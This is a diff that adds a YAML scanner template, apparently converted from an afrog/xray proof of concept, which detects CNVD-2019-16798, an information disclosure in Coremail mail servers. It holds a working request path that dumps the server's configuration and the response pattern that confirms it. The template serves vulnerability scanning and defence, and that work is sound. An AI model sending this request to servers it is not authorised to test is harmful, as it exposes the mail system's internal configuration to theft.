@@ -1,0 +1,26 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <object name="cm_md_db">
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/'
+id: CNVD-2019-16798
+info:
+  author: cc_ci
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Coremail Information Disclosure
+  severity: high
+  tags: cnvd,cnvd2019,coremail,disclosure,argus-import
